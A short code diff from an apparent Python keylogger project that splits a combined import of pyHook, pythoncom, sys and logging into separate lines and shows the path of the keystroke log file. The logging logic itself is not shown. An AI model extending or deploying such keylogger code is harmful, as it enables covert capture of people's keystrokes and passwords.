@@ -1,6 +1,9 @@
 # 'keylogger' project by Suriyaa Kudo @ https://github.com/SuriyaaKudoIsc/keylogger
 
-import pyHook, pythoncom, sys, logging
+import pyHook
+import pythoncom
+import sys
+import logging
 
 file_log = 'C:\\Program Files\\keylogger\\log.txt'
 
